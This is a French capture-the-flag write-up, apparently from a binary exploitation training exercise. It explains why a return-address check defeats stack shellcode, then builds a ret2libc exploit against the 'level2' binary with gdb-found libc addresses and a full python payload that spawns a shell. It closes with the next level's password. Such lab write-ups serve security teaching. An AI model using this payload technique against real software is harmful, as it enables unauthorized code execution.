En utilisant disass de GDB on voit l'utilisation de la fonction p()
En allant voir la fonction p() on remarque l'utilisation de gets ( qui va nous permettre d'utiliser un buffer overflow ). On pourrait écrire notre propre shellcode, le mettre dans la stack et faire pointer EIP dessus pour lancer un shell admin.
Mais apres gets() la fonction p va vérifier l'adresse de retour de la fonction avec 0xb0000000. 

0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
0x080484fb <+39>:    and    $0xb0000000,%eax
0x08048500 <+44>:    cmp    $0xb0000000,%eax

Si on fait pointer sur par exemple 0xbfffff01, on aurait comme comparaison ((0xbfffff01 & 0xb0000000) == 0xb0000000) 
0xbfffff01 = 10111111 11111111 11111111 00000001
AND
0xb0000000 = 10110000 00000000 00000000 00000000
En opération binaire 1 & 0 = 0 donc on obtient
0xb0000000 = 10110000 00000000 00000000 00000000

Nous ne pouvont donc pas overwrite EIP avec une adresse commencant par 0xb, ce qui est le cas de toutes les adresses de la stack. 

En revanche on peut utiliser un ret2libc ce qui va nous permettre de bypass la vérification de notre eip et donc de quand même exécuter notre command pour lancer le shell.

Un ret2libc se forme comme ceci:

"notre buffer size max" + "l'adresse du return de la fonction p" + "l'adresse de la fonction system" + "l'adresse de la fonction exit ( qui sert de fonction de retour pour system )" + " notre argument pour la fonction system donc l'adresse de la string /bin/sh"

Toutes ces informations sont disponibles dans le système en dehors de l'exécutable, et avec l'Address Space Layout Randomization (ASLR) désactivé, on peut accéder à leur adresse mémoire via gdb. Il suffit de mettre un breakpoint dans le programme, le run puis d'utiliser les commandes suivantes:

`print &system` --> 0xb7e6b060 (adresse de system()) 
`print &exit`   --> 0xb7e5ebe0 (adresse de exit())
`disass p`     --> 0x0804853e (call assembly de ret)
`find &system, +9999999, "/bin/sh"` --> 0xb7f8cc58 (adresse de la string "/bin/sh") 

Il nous manque que l'offset afin de savoir quel taille fait notre buffer.
j'utilise un generateur de pattern pour faciliter la tache
(wiremask.eu   buffer overflow pattern generator)

La taille du buffer est donc de 80.

Nous pouvons donc maintenant faire notre input ( attention au little endian )
`python -c "print('\x90'*80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')"`

On ajoute juste la commande cat pour que le shell reste actif.

`(python -c "print('\x90'*80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')" ; cat) | ./level2`

cat /home/level3/.pass

492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
